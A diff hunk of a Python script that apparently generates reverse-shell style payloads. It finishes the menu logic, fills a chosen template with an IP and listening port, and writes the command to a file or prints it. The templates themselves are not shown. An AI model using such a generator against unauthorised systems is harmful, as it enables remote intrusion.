@@ -46,4 +46,30 @@ def main():
     for key, value in payloads.items():
         print(f"{key}. {value['desc']}")
     
-    choice = input("\nEnter c
+    choice = input("\nEnter choice (1-3): ").strip()
+    if choice not in payloads:
+        print(f"{RED}[!] Invalid choice. Exiting.{RESET}")
+        sys.exit(1)
+    
+    desc = payloads[choice]["desc"]
+    template = payloads[choice]["template"]
+    
+    # Final command
+    final_command = template.format(ip=ip, port=lport)
+    
+    # Ask export or display
+    export_choice = input(f"\n{YELLOW}Do you want to export the payload to a file? (y/n): {RESET}").strip().lower()
+    
+    if export_choice == 'y':
+        filename = input("Enter filename (default: payload.txt): ").strip() or "payload.txt"
+        try:
+            with open(filename, 'w') as f:
+                f.write(final_command)
+            print(f"\n{GREEN}[+] Payload successfully exported to {filename}{RESET}")
+        except Exception as e:
+            print(f"\n{RED}[!] Error writing to file: {e}{RESET}")
+    else:
+        print_output(final_command, desc, lport)
+
+if __name__ == "__main__":
+    main()
